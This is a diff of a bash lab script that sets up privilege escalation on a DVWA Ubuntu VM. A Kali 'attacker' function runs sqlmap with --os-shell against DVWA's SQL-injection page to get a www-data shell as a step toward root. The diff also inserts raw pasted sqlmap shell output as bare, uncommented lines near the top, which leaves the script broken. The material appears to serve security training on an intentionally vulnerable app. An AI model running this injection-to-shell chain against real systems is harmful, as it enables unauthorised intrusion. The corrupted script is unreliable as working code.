@@ -2,6 +2,13 @@
 # Script Name: dvwa-peas.sh
 # Description: Automates privilege escalation setup on a DVWA Ubuntu VM and guides the user through the exploit.
 
+os-shell> whoamido you want to retrieve the command standard output? [Y/n/a] Y
+
+command standard output: 'www-data'
+os-shell> /tmp/escalate
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output: 'sh: 1: /tmp/escalate: not found'
+
 #
 # === Usage Instructions ===
 #
@@ -158,35 +165,37 @@ ubuntu_run_peas_scan() {
 ### === KALI VM FUNCTIONS (ATTACKER) === ###
 
 kali_exploit_sqlmap_os_shell() {
+    # This function is included from the previous script to make this one self-contained.
     print_title "Running SQLmap OS Shell Exploitation"
 
-    # Validate required environment variables
+    # Check required variables
     if [ -z "${DVWA_TARGET_URL:-}" ]; then print_error "DVWA_TARGET_URL not set."; exit 1; fi
     if [ -z "${DVWA_PHPSESSID:-}" ]; then print_error "DVWA_PHPSESSID not set."; exit 1; fi
 
-    # Display settings
+    # Show config info
     print_info "Using DVWA Target URL: ${DVWA_TARGET_URL}"
     print_info "Using PHPSESSID: ${DVWA_PHPSESSID}"
 
-    # Setup variables
+    # Define paths and variables
     local TARGET="${DVWA_TARGET_URL%/}"
     local PHPSESSID="$DVWA_PHPSESSID"
-    local SQLI_URL="${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
-    local COOKIE_HEADER="Cookie: security=low; PHPSESSID=${PHPSESSID}"
-
-    # Determine output directory
     local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
     local USER_HOME=$(eval echo "~${TARGET_USER}")
-    local OUTDIR="${USER_HOME}/scans/dvwa/os_shell_loot"
+    local OUTDIR="${USER_HOME}/scans/dvwa/os_shell_root"
 
-    # Create output directory
+    # Prepare output directory
     sudo mkdir -p "$OUTDIR"
-    sudo chown -R "$TARGET_USER:$TARGET_USER" "$OUTDIR"
+    sudo chown -R "$TARGET_USER":"$TARGET_USER" "$OUTDIR"
 
-    # SQLMap flags
-    declare -a SQLMAP_ARGS=(
+    # Warnings
+    print_warn "This requires DVWA security 'Low', a vulnerable MySQL backend, and a world-writable web directory."
+
+    # Construct updated sqlmap arguments (surgically replaced)
+    local SQLI_URL="${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
+    local COOKIE_STRING="Cookie: security=low; PHPSESSID=${PHPSESSID}"
+    declare -a SQLMAP_BASE_ARGS=(
         -u "${SQLI_URL}"
-        -H "${COOKIE_HEADER}"
+        -H "${COOKIE_STRING}"
         --batch
         --flush-session
         --level=5
@@ -200,15 +209,14 @@ kali_exploit_sqlmap_os_shell() {
         --os-shell
     )
 
-    print_warn "Ensure DVWA is set to 'Low' security and MySQL is vulnerable."
-    print_info "Running SQLMap with OS Shell exploit..."
-    echo
+    # Run the updated sqlmap command
+    print_info "Attempting to get initial 'www-data' shell using SQLmap.."
+    print_info "Running sqlmap ${SQLMAP_BASE_ARGS[@]} command"
+    sudo -u "$TARGET_USER" sqlmap "${SQLMAP_BASE_ARGS[@]}" | tee "${OUTDIR}/sqlmap_os_shell.log"
 
-    # Run sqlmap as target user
-    sudo -u "$TARGET_USER" sqlmap "${SQLMAP_ARGS[@]}"
-
-    print_success "SQLmap process completed."
-    print_warn "If no shell appeared, check logs in ${OUTDIR} for troubleshooting."
+    # Post-execution messages
+    print_success "SQLmap OS shell process finished. If successful, you should have an interactive shell."
+    print_warn "If the shell did not spawn, check the logs in ${OUTDIR} for errors."
 }
 
 guide_trigger_escalation() {
